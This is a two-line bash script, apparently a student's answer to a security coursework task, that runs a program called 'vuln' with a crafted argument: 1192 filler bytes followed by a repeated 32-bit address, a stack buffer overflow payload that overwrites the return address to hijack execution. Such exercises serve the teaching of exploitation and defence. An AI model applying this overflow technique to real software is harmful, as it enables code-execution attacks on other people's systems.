#!/usr/bin/env bash
/task2/s1828233/vuln "$(python -c "print('a' * 1192 + '\x56\x85\x04\x08' * 8)")"
